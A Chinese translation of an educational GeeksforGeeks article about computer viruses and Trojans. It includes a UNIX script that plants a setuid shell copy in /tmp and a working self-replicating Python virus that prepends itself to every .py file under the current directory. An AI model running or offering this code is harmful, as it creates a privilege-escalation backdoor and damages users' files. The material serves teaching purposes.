# 病毒——从新手到专业人士

> 原文:[https://www.geeksforgeeks.org/viruses-from-newbie-to-pro/](https://www.geeksforgeeks.org/viruses-from-newbie-to-pro/)

*注意:使用在线编译器在这里行不通。请安装 Python 2.7x 和 cv2，argparse 模块来实际尝试这个例子。*

嗨，朋友们！欢迎回来！在继续恶意逻辑之前，我请求你看一下这篇伟大的、信息丰富的文章[蠕虫、病毒和超越](https://www.geeksforgeeks.org/worms-viruses-and-beyond/)！！

现在，本文将更多地关注应用程序，而不是计算机病毒、蠕虫和特洛伊木马的理论。

*但是，请注意，本文仅用于教育目的。**本人绝不推广使用病毒、蠕虫或木马攻击计算机系统并造成损害。**T3】*

恶意逻辑是导致违反网站/程序/应用程序等安全策略的一组指令(基本上是一个程序)。

**UNIX 脚本**

```
    cp /bin/sh /tmp/.xxsh
    chmod u+s,o+x /tmp/.xxsh
    rm ./ls
    ls $*

```

在这个例子中，我们假设。位于路径环境中，脚本名为 ls，位于目录中。

**分析脚本**

这个脚本创建了一个 UNIX Shell 的副本，它是执行这个程序的用户的 setuid。要理解 setuid 程序，我们首先需要了解用户身份在 UNIX 操作系统中是如何存储的。

在 UNIX 操作系统中，用户标识通常表示为 0 到 65，535 之间的整数。这个号码也被称为 UID(唯一识别号码)。现在，setuid 程序所做的是用所有者的 uid 而不是执行程序的第三方的 UID 来创建进程。这意味着，执行人将拥有所有者的权利……这本身就是一个可能的漏洞。

回到我们的脚本，因此创建了 UNIX shell 的 setuid 副本。稍后，删除该程序，然后执行正确的 ls 命令(用于列出当前工作目录中的文件和文件夹)。

**木马**

回到上一个脚本…假设有人(根)键入:

```
    cp /bin/sh /tmp/.xxsh
    chmod o+s,w+x /tmp.xxsh

```

如果脚本是故意键入的，那么它将导致特洛伊木马。

**病毒–一种基本格式**

大多数计算机病毒遵循以下基本脚本:

```
Beginvirus
if spread-condition TRUE then begin
    for the target files begin
       if target affected TRUE then begin
          Determine where to place virus instructions
          Copy the virus instructions
          Modify target to spread the virus later
       End if
    End for
End if
Perform some other instruction(s) //Optional
Go back to beginning
Endvirus

```

基本上，每种计算机病毒都有两个阶段——

1.  插入阶段——在这个阶段，病毒将自己插入目标体内。
2.  执行阶段——在这个阶段，病毒会执行一些动作。

让我们来看看 Python 中的一个真实病毒。现在这不是一个真正的病毒，它会导致文件损坏，系统文件删除等。**不过只是一种简单无害的病毒。**

```
#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"

#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 

        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 

        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":

            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 

#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
        f.write(virusstring + temp) 
        f.close() 

#Not required actually        
def explode(): 
    if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1: 
            print ("HAPPY APRIL FOOL'S DAY!!")
filestoinfect = search(os.path.abspath("")) 
infect(filestoinfect) 
explode() 
```

现在，这是一个相当安全的病毒但是，基本格式和工作原理是一样的。

此外，还有各种类型的计算机病毒——引导区感染病毒、可执行感染病毒、多部分病毒、TSR 病毒、隐形病毒、加密病毒、多态病毒、宏病毒。

现在，我不再赘述，就讲到这里。那都是从我这边来的！

**关于作者:**

**维斯韦什·施里马里**是 BITS Pilani 的机械工程本科生。他满足了 [![vish](http://d1gjlxt8vb0knt.cloudfront.net//wp-content/uploads/vish-100x100.png)](http://d1gjlxt8vb0knt.cloudfront.net//wp-content/uploads/vish.png) 所有在他的分支机构中没有教授的要求——白帽黑客、网络安全操作员和前竞争性程序员。作为 Python 力量的坚定信仰者，他的大部分作品都是同一种语言。每当他除了编程、上课、看 CSI Cyber 之外有时间的时候，他都会去散步，默默地弹吉他。他的人生格言是——“享受你的生活，因为它值得享受！”

**如果你也想在这里展示你的博客，请查看[博客](http://geeksquiz.com/gblog/)在极客博客上的客座博文。**